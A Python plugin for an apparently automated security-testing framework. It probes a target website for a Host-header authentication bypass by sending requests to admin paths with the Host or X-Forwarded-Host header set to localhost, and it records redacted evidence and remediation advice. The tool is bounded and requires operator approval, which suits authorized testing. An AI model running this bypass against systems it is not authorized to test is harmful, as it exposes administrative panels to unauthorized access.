"""Bounded URL-only HTTP Host-header authentication-bypass proof (#1288).

The probe always connects to the authorized URL host (and therefore preserves
its DNS destination and TLS SNI) while varying only one tool-owned request
header.  It discovers likely administrative paths, brackets each candidate
with repeat controls, rejects catch-all content, and returns sanitized HTTP
transcripts.  Callers cannot supply headers, cookies, alternate hosts, paths,
payloads, wordlists, internal ranges, or raw requests.
"""

from __future__ import annotations

import asyncio
import hashlib
import re
import secrets
import socket
import ssl
from difflib import SequenceMatcher
from html import unescape
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlsplit

from plugin_interface import ToolPlugin
from tools.web_authentication_probe import sanitize_evidence_text
from tools.web_request_smuggling_probe import (
    BoundedHttpResponseTruncated,
    bounded_http_incomplete_result,
    raise_for_truncated_http_response,
    read_http_response,
)


MODE = "host-auth-bypass-differential-v1"
USER_AGENT = "xASM-Agentic-Host-Header-Probe/1.0"
MAX_RESPONSE_BYTES = 96_000
MAX_EVIDENCE_CHARS = 12_000
DEFAULT_REQUEST_BUDGET = 16
MAX_REQUEST_BUDGET = 24
DENIED_STATUSES = {401, 403}
LOCAL_HOST = "localhost"

ADMIN_PATH_RE = re.compile(
    r"(?i)(?:^|/)(?:admin(?:istrator)?|internal|manage(?:ment)?|staff|control-panel)(?:/|$)"
)
ADMIN_BODY_RE = re.compile(
    r"(?is)(?:<title[^>]*>[^<]{0,80}\badmin(?:istration|istrator)?\b|"
    r"<h[1-3][^>]*>[^<]{0,120}\badmin(?:istration|istrator)?\b|"
    r"\badmin(?:istration)?\s+(?:dashboard|panel|console|area)\b|"
    r"\buser\s+management\b|\bmanage\s+users\b|data-role=[\"']admin[\"'])"
)
ADMIN_SEMANTICS = {
    "admin_title": re.compile(r"(?is)<title[^>]*>[^<]{0,100}\badmin(?:istration|istrator)?\b"),
    "admin_heading": re.compile(r"(?is)<h[1-3][^>]*>[^<]{0,140}\badmin(?:istration|istrator)?\b"),
    "admin_area": re.compile(r"(?i)\badmin(?:istration)?\s+(?:dashboard|panel|console|area)\b"),
    "user_management": re.compile(r"(?i)\b(?:user\s+management|manage\s+users)\b"),
    "admin_role": re.compile(r"(?i)data-role=[\"']admin[\"']"),
}
ROBOTS_PATH_RE = re.compile(r"(?im)^\s*(?:allow|disallow)\s*:\s*([^\s#]+)")
LINK_RE = re.compile(
    r"(?is)\b(?:href|action)\s*=\s*(?:\"([^\"]+)\"|'([^']+)'|([^\s>]+))"
)
VOLATILE_RE = re.compile(
    r"(?i)(?:[0-9a-f]{8}-[0-9a-f-]{27,}|[0-9a-f]{24,}|\b\d{6,}\b|"
    r"(?:csrf|nonce|token)[\"'\s:=_-]+[A-Za-z0-9._~+/-]{6,})"
)
EMAIL_RE = re.compile(r"(?i)\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b")
SSN_RE = re.compile(r"\b\d{3}-\d{2}-\d{4}\b")
LONG_TOKEN_RE = re.compile(r"\b(?:eyJ[A-Za-z0-9_-]{20,}|[A-Za-z0-9_+/.=-]{40,})\b")


def validate_target(value: Any) -> Optional[str]:
    raw = str(value or "").strip()
    if not raw or len(raw) > 4_096 or "\r" in raw or "\n" in raw:
        return None
    try:
        parsed = urlsplit(raw)
    except Exception:
        return None
    if (
        parsed.scheme.lower() not in {"http", "https"}
        or not parsed.hostname
        or parsed.username
        or parsed.password
        or parsed.query
        or parsed.fragment
    ):
        return None
    path = parsed.path or "/"
    return f"{parsed.scheme.lower()}://{parsed.netloc}{path}"


def origin_for(target: str) -> str:
    parsed = urlsplit(target)
    return f"{parsed.scheme}://{parsed.netloc}/"


def path_and_query(url: str) -> str:
    parsed = urlsplit(url)
    return (parsed.path or "/") + (f"?{parsed.query}" if parsed.query else "")


def canonical_host(target: str) -> str:
    parsed = urlsplit(target)
    default_port = 443 if parsed.scheme == "https" else 80
    if parsed.port and parsed.port != default_port:
        return f"{parsed.hostname}:{parsed.port}"
    return str(parsed.hostname)


def validate_parameters(parameters: Dict[str, Any]) -> Tuple[bool, str]:
    if not validate_target(parameters.get("target")):
        return False, "target must be a credential-free HTTP(S) URL without query or fragment"
    if str(parameters.get("mode") or MODE) != MODE:
        return False, f"mode must be {MODE}"
    engagement = str(parameters.get("engagement") or "").lower()
    if engagement not in {
        "standard",
        "aggressive",
        "lab",
        "ctf",
    }:
        return False, "engagement must be standard, aggressive, lab, or ctf"
    if engagement != "standard" and parameters.get("hostHeaderOverrideApproved") is not True:
        return False, "hostHeaderOverrideApproved=true is required"
    try:
        timeout = int(parameters.get("timeoutSeconds") or 15)
        budget = int(parameters.get("requestBudget") or DEFAULT_REQUEST_BUDGET)
    except (TypeError, ValueError):
        return False, "timeoutSeconds and requestBudget must be integers"
    if timeout < 3 or timeout > 30:
        return False, "timeoutSeconds must be between 3 and 30"
    if budget < 8 or budget > MAX_REQUEST_BUDGET:
        return False, f"requestBudget must be between 8 and {MAX_REQUEST_BUDGET}"
    return True, ""


def _body_fingerprint(body: str) -> str:
    normalized = VOLATILE_RE.sub("<volatile>", unescape(body or ""))
    normalized = re.sub(r"\s+", " ", normalized).strip().lower()
    return normalized[:64_000]


def _stable_response(left: Dict[str, Any], right: Dict[str, Any]) -> bool:
    if left["status"] != right["status"]:
        return False
    if left["status"] in {301, 302, 303, 307, 308}:
        return str(left["headers"].get("Location") or "") == str(
            right["headers"].get("Location") or ""
        )
    a, b = _body_fingerprint(left["body"]), _body_fingerprint(right["body"])
    if not a or not b:
        return a == b
    return SequenceMatcher(None, a, b).ratio() >= 0.88


def _distinct_from_negative(proof: Dict[str, Any], negative: Dict[str, Any]) -> bool:
    if proof["status"] != negative["status"]:
        return True
    a, b = _body_fingerprint(proof["body"]), _body_fingerprint(negative["body"])
    if not a or not b:
        return False
    return SequenceMatcher(None, a, b).ratio() < 0.72


def _denied_response(response: Dict[str, Any]) -> bool:
    return response["status"] in DENIED_STATUSES


def _admin_semantics(body: str) -> List[str]:
    return [name for name, pattern in ADMIN_SEMANTICS.items() if pattern.search(body or "")]


def _redact_admin_body(body: str) -> Tuple[str, bool]:
    cleaned = EMAIL_RE.sub("<redacted-email>", str(body or ""))
    cleaned = SSN_RE.sub("<redacted-identifier>", cleaned)
    cleaned = LONG_TOKEN_RE.sub("<redacted-token>", cleaned)
    cleaned = sanitize_evidence_text(cleaned, (), 3_500)
    truncated = len(cleaned) < len(str(body or "")) or "evidence excerpt truncated" in cleaned
    return cleaned, truncated


def _request_transcript(url: str, sent_host: str, forwarded_host: Optional[str]) -> str:
    lines = [
        f"GET {path_and_query(url)} HTTP/1.1",
        f"Host: {sent_host}",
        f"User-Agent: {USER_AGENT}",
        "Accept: text/html,application/xhtml+xml,application/json",
        "Accept-Encoding: identity",
        "Cache-Control: no-cache, no-store, max-age=0",
        "Pragma: no-cache",
        "Connection: close",
    ]
    if forwarded_host:
        lines.append(f"X-Forwarded-Host: {forwarded_host}")
    return sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n", (), MAX_EVIDENCE_CHARS
    )


def _response_transcript(response: Dict[str, Any]) -> Tuple[str, bool]:
    lines = [f"HTTP/1.1 {response['status']} {response['reason']}"]
    included = {"content-type", "location", "server", "vary", "via", "x-cache"}
    for name, value in response["headers"].items():
        if str(name).lower() in included:
            lines.append(f"{name}: {value}")
    body, body_truncated = _redact_admin_body(str(response.get("body") or ""))
    transcript = sanitize_evidence_text(
        "\r\n".join(lines) + "\r\n\r\n" + body, (), MAX_EVIDENCE_CHARS
    )
    return transcript, bool(response.get("truncated")) or body_truncated


def evidence_step(
    label: str,
    url: str,
    response: Dict[str, Any],
    sent_host: str,
    forwarded_host: Optional[str] = None,
) -> Dict[str, Any]:
    request = _request_transcript(url, sent_host, forwarded_host)
    response_text, excerpt_truncated = _response_transcript(response)
    return {
        "label": label,
        "request": request,
        "requestSha256": hashlib.sha256(request.encode()).hexdigest(),
        "response": response_text,
        "responseSha256": hashlib.sha256(response_text.encode()).hexdigest(),
        "responseBodySha256": hashlib.sha256(
            str(response.get("body") or "").encode()
        ).hexdigest(),
        "responseStatus": int(response["status"]),
        "responseBodyLength": len(str(response.get("body") or "").encode()),
        "responseExcerptTruncated": excerpt_truncated,
    }


def build_finding(target: str, verification: Dict[str, Any]) -> Dict[str, Any]:
    steps = verification["httpEvidence"]["steps"]
    proof = next(step for step in steps if step["label"] == "host-override-proof")
    return {
        "template-id": "xasm-host-header-auth-bypass-verified",
        "matcher-name": "repeated-denied-to-admin-host-differential",
        "type": "http",
        "host": origin_for(target),
        "matched-at": verification["matchedUrl"],
        "request": proof["request"],
        "response": proof["response"],
        "info": {
            "name": "Host Header Authentication Bypass",
            "severity": "high",
            "description": (
                "The same administrative URL was repeatedly denied with the canonical Host "
                "but returned stable administrative content when the request Host was changed "
                "to localhost while the network destination and TLS SNI remained unchanged."
            ),
            "remediation": (
                "Do not derive client trust or authorization from Host or forwarding headers. "
                "Use authenticated authorization checks, enforce a strict canonical-host "
                "allowlist at every proxy hop, and overwrite untrusted forwarding headers."
            ),
            "classification": {"cwe-id": ["CWE-346"]},
        },
        "evidence": verification,
    }


class HostHeaderProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "web:host_header_probe"

    @property
    def description(self) -> str:
        return (
            "Discovers administrative paths from a root URL and confirms a Host-header "
            "authentication bypass with repeated denied controls, repeated localhost-Host "
            "proofs, a catch-all negative control, and sanitized Request/Response evidence."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "additionalProperties": False,
            "required": ["target"],
            "properties": {
                "target": {"type": "string", "format": "uri"},
                "mode": {"type": "string", "enum": [MODE], "default": MODE},
                "timeoutSeconds": {
                    "type": "integer", "minimum": 3, "maximum": 30, "default": 15,
                },
                "requestBudget": {
                    "type": "integer",
                    "minimum": 8,
                    "maximum": MAX_REQUEST_BUDGET,
                    "default": DEFAULT_REQUEST_BUDGET,
                },
                "engagement": {
                    "type": "string",
                    "enum": ["standard", "aggressive", "lab", "ctf"],
                },
                "hostHeaderOverrideApproved": {
                    "type": "boolean",
                    "default": False,
                    "description": "Server-owned operator-approval flag",
                },
            },
        }

    @property
    def metadata(self) -> Dict[str, Any]:
        return {
            "category": "exploit-test",
            "phase": 4,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings", "host_header_proof"],
            "taxonomy_domain": ["web"],
            "lifecycle_phase": "exploit-test",
            "purpose_count": "single",
            "primary_purpose": "Confirm a Host-header authentication bypass",
            "secondary_purposes": [],
        }

    async def _request(
        self,
        url: str,
        sent_host: str,
        forwarded_host: Optional[str] = None,
    ) -> Dict[str, Any]:
        self._requests += 1
        parsed = urlsplit(url)
        request_lines = [
            f"GET {path_and_query(url)} HTTP/1.1",
            f"Host: {sent_host}",
            f"User-Agent: {USER_AGENT}",
            "Accept: text/html,application/xhtml+xml,application/json",
            "Accept-Encoding: identity",
            "Cache-Control: no-cache, no-store, max-age=0",
            "Pragma: no-cache",
            "Connection: close",
        ]
        if forwarded_host:
            request_lines.append(f"X-Forwarded-Host: {forwarded_host}")
        raw_request = ("\r\n".join(request_lines) + "\r\n\r\n").encode("ascii")

        ssl_context: Optional[ssl.SSLContext] = None
        server_hostname: Optional[str] = None
        if parsed.scheme == "https":
            ssl_context = ssl.create_default_context()
            server_hostname = self._original_hostname
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(
                host=self._pinned_ip,
                port=self._original_port,
                family=self._address_family,
                ssl=ssl_context,
                server_hostname=server_hostname,
            ),
            timeout=self._timeout,
        )
        try:
            writer.write(raw_request)
            await asyncio.wait_for(writer.drain(), timeout=self._timeout)
            raw_response = await read_http_response(
                reader, self._timeout, max_body_bytes=MAX_RESPONSE_BYTES
            )
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except (ConnectionError, ssl.SSLError):
                pass

        raise_for_truncated_http_response("GET", url, raw_response)
        status_line = str(raw_response.get("statusLine") or "")
        status_parts = status_line.split(" ", 2)
        headers: Dict[str, str] = {}
        for name, value in raw_response.get("headers") or []:
            headers[str(name)] = str(value)
        return {
            "status": int(raw_response["status"]),
            "reason": status_parts[2][:100] if len(status_parts) > 2 else "",
            "headers": headers,
            "body": str(raw_response.get("body") or ""),
            "truncated": False,
        }

    async def _pin_target(self, target: str) -> None:
        parsed = urlsplit(target)
        hostname = str(parsed.hostname or "")
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        loop = asyncio.get_running_loop()
        addresses = await asyncio.wait_for(
            loop.getaddrinfo(hostname, port, type=socket.SOCK_STREAM),
            timeout=self._timeout,
        )
        if not addresses:
            raise OSError("target DNS resolution returned no addresses")
        family, _socktype, _proto, _canonname, sockaddr = addresses[0]
        self._original_hostname = hostname
        self._original_port = port
        self._address_family = family
        self._pinned_ip = str(sockaddr[0])

    def _candidate_paths(self, target: str, root_body: str, robots_body: str) -> List[str]:
        origin = origin_for(target)
        values: List[str] = []
        for match in ROBOTS_PATH_RE.finditer(robots_body or ""):
            values.append(match.group(1))
        for match in LINK_RE.finditer(root_body or ""):
            value = next((group for group in match.groups() if group), "")
            values.append(value)
        values.extend(["/admin", "/administrator", "/internal"])

        out: List[str] = []
        seen: set[str] = set()
        base = urlsplit(origin)
        for raw in values:
            absolute = urljoin(origin, str(raw or "").strip())
            parsed = urlsplit(absolute)
            if (
                parsed.scheme != base.scheme
                or parsed.netloc != base.netloc
                or parsed.query
                or parsed.fragment
                or not ADMIN_PATH_RE.search(parsed.path)
            ):
                continue
            path = parsed.path or "/"
            if path not in seen:
                seen.add(path)
                out.append(path)
            if len(out) >= 3:
                break
        return out

    async def _probe_variant(
        self,
        target: str,
        path: str,
        canonical: str,
        forwarded: bool,
    ) -> Optional[Dict[str, Any]]:
        if self._requests + 6 > self._budget:
            return None
        url = urljoin(origin_for(target), path.lstrip("/"))
        negative_url = urljoin(
            origin_for(target), f".xasm-host-negative-{secrets.token_hex(10)}"
        )
        proof_host = canonical if forwarded else LOCAL_HOST
        proof_forwarded = LOCAL_HOST if forwarded else None

        baseline_one = await self._request(url, canonical)
        baseline_two = await self._request(url, canonical)
        proof_one = await self._request(url, proof_host, proof_forwarded)
        proof_two = await self._request(url, proof_host, proof_forwarded)
        negative = await self._request(
            negative_url, proof_host, proof_forwarded
        )
        canonical_replay = await self._request(url, canonical)

        semantics_one = _admin_semantics(proof_one["body"])
        semantics_two = _admin_semantics(proof_two["body"])
        verified = (
            _denied_response(baseline_one)
            and _stable_response(baseline_one, baseline_two)
            and proof_one["status"] == 200
            and _stable_response(proof_one, proof_two)
            and len(semantics_one) >= 2
            and len(set(semantics_one).intersection(semantics_two)) >= 2
            and not ADMIN_BODY_RE.search(negative["body"])
            and _distinct_from_negative(proof_one, negative)
            and _denied_response(canonical_replay)
            and _stable_response(baseline_one, canonical_replay)
            and not ADMIN_BODY_RE.search(canonical_replay["body"])
        )
        if not verified:
            return None

        variant = "x-forwarded-host-localhost" if forwarded else "host-localhost"
        steps = [
            evidence_step("canonical-control-1", url, baseline_one, canonical),
            evidence_step("canonical-control-2", url, baseline_two, canonical),
            evidence_step(
                "host-override-proof", url, proof_one, proof_host, proof_forwarded
            ),
            evidence_step(
                "host-override-repeat", url, proof_two, proof_host, proof_forwarded
            ),
            evidence_step(
                "host-override-negative-control",
                negative_url,
                negative,
                proof_host,
                proof_forwarded,
            ),
            evidence_step(
                "canonical-replay-denied", url, canonical_replay, canonical
            ),
        ]
        return {
            "verified": True,
            "mode": MODE,
            "variant": variant,
            "matchedUrl": url,
            "canonicalHost": canonical,
            "overrideHost": LOCAL_HOST,
            "networkDestinationPreserved": True,
            "tlsSniPreserved": urlsplit(target).scheme == "https",
            "canonicalStatus": baseline_one["status"],
            "overrideStatus": proof_one["status"],
            "adminContentMarker": True,
            "adminSemantics": semantics_one,
            "repeatControlsStable": True,
            "catchAllRejected": True,
            "canonicalReplayDenied": True,
            "fallback": False,
            "httpEvidence": {"version": 1, "steps": steps},
        }

    async def execute(self, parameters: Dict[str, Any]) -> Dict[str, Any]:
        valid, reason = validate_parameters(parameters)
        if not valid:
            return {
                "success": False,
                "tool": self.name,
                "verified": False,
                "fallback": False,
                "error": reason,
                "findings": [],
            }

        if str(parameters.get("engagement") or "").lower() == "standard":
            return {
                "success": True,
                "tool": self.name,
                "target": validate_target(parameters.get("target")),
                "mode": MODE,
                "verified": False,
                "skipped": True,
                "fallback": False,
                "requestCount": 0,
                "findings": [],
                "total_findings": 0,
                "verification": {
                    "verified": False,
                    "mode": MODE,
                    "requestCount": 0,
                    "fallback": False,
                    "reason": "Host override probe requires aggressive, lab, or ctf engagement",
                },
            }

        target = validate_target(parameters.get("target"))
        assert target is not None
        canonical = canonical_host(target)
        self._requests = 0
        self._budget = int(parameters.get("requestBudget") or DEFAULT_REQUEST_BUDGET)
        timeout = int(parameters.get("timeoutSeconds") or 15)
        verification: Optional[Dict[str, Any]] = None

        self._timeout = timeout
        try:
            await self._pin_target(target)
            root = await self._request(target, canonical)
            robots = await self._request(
                urljoin(origin_for(target), "robots.txt"), canonical
            )
            paths = self._candidate_paths(target, root["body"], robots["body"])
            for path in paths:
                for forwarded in (False, True):
                    verification = await self._probe_variant(
                        target, path, canonical, forwarded
                    )
                    if verification:
                        # A calibration fixture may expose a solved banner on the
                        # input URL. The finding does not depend on this marker.
                        if self._requests < self._budget and "not solved" in root["body"].lower():
                            post = await self._request(target, canonical)
                            if "solved" in post["body"].lower() and "not solved" not in post["body"].lower():
                                verification["labSolvedTransition"] = True
                                verification["httpEvidence"]["steps"].append(
                                    evidence_step(
                                        "solved-confirmation", target, post, canonical
                                    )
                                )
                        break
                if verification:
                    break
        except BoundedHttpResponseTruncated as exc:
            return bounded_http_incomplete_result(
                self.name, target, self._requests, exc, mode=MODE
            )
        except (OSError, ConnectionError, TimeoutError, ValueError, ssl.SSLError) as exc:
            return {
                "success": False,
                "tool": self.name,
                "target": target,
                "verified": False,
                "fallback": False,
                "error": f"target request failed: {type(exc).__name__}",
                "findings": [],
            }

        if verification:
            verification["requestCount"] = self._requests
        findings = [build_finding(target, verification)] if verification else []
        return {
            "success": True,
            "tool": self.name,
            "target": target,
            "mode": MODE,
            "verified": bool(verification),
            "fallback": False,
            "requestCount": self._requests,
            "findings": findings,
            "total_findings": len(findings),
            "verification": verification
            or {
                "verified": False,
                "mode": MODE,
                "requestCount": self._requests,
                "fallback": False,
                "reason": "no repeated denied-to-admin Host-header differential was proven",
            },
            "summary": {
                "requestCount": self._requests,
                "findings": len(findings),
                "fallback": False,
            },
        }


def get_tool() -> HostHeaderProbeTool:
    return HostHeaderProbeTool()
